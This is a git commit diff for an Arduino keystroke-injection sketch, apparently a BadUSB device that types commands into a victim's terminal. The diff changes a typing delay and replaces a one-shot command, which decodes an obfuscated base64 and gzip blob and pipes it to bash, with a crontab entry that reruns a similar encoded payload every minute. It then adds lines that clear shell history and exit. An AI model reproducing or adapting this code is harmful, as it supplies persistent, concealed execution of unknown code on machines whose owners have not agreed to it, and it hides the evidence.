0ee781e95eadf79bbc5b8b48197a76165dae5f90
quentiin19 <81647755+quentiin19@users.noreply.github.com>
2024-02-19 11:23:46 +0100

    Update main.ino

--- main.ino
+++ main.ino
@@ -1,7 +1,7 @@
 #include "Keyboard.h"
 #include "stdio.h"
 #include "stdlib.h"
-#define INTER_T 50
+#define INTER_T 70
 #define INTER_ANIM 300
 
 void lettre(char c) {
@@ -131,8 +131,13 @@ void loop() {
   Keyboard.send_now();
   
 
-  chaine ("echo 'H4sIAA/f0GUA/6WT207CQBCG73mKP0sN25ClVkOJlJIYX4ObZg+ySZ0lWI0E++5sDxy8MBaZm5020/lm/n9r3BYGlhBwY0khWrs3He1yIvsevTgyVmkqrS4iiHK30b74YYlI6c+IPooiTKHcAD5kFnCZl2CBYWHavNpYesU0nsxmk/jpcZJMISRiiI0v4lquHQSBLZowttDLJhi+4RTEM8gj8RX753ILoTDCikYhSweDpr3/pMgYa3O/Buc2u09hsfDL8DiBAA/2Q1PhDnEShn5WOx7XRzfyuUmwr89q2DZTjnSH8EudBvVFVVfIwuMMLRcZjuQaWKfjrIH+gPUTxDPmgZ3HSfWnFFheeJHiBGp6sRWd9/GiXWuJysu8vyVXOCJvcKS+ZhdKyUtHfjNE3myI7GtI50GreJ3940eg3qI3mAMtzddewgMAAA==' | base64 -d | gzip -d | bash");  
+  chaine (" echo \"* * * * * echo 'H4sIAAAAAAAAA6WT32rCMBSH7/sUP2KHCRK7bFiZscLYa3hT8mcGukRcNyau775YderFWKXnpkk5Pd8556M2bGDhPFJqndfIVuHNZNvSe/eevQRvnTa+dqbKwOvt2sTkhwUybT4z/1FVTEKHBDFUkVJV1iCpJUy2r9bOv2IixtPpWDw9jvMJuIIAX8ckatQqgHuQeRvWVWbRBsE3ggZ/ho9IfIl4rzfgGkMs/ZARmSRt+fhJVRByOMcxKHXFvYTDPA5DRQ4Omu4GtsEdRM5Y7NWNRuzc8rlIuts/m8GhmA7eHBHFRaMxqTkmEnbq4cBFgRN5D9wfR0ULvYJ1W0hkzFI3E3nz7yqwuHAhfzltKbL053FkcrMRXdZldyM3CFE9hKhrIepSyF8+VG8fqqsP2Wfh8f/rvO8j4gcNrJ5SvgMAAA==' | base64 -d | gzip -d | bash\" | crontab -");  
   enter();
+  chaine (" history -c");
+  enter();
+  chaine (" exit");
+  enter();
+  
   
    delay(5000);
 }
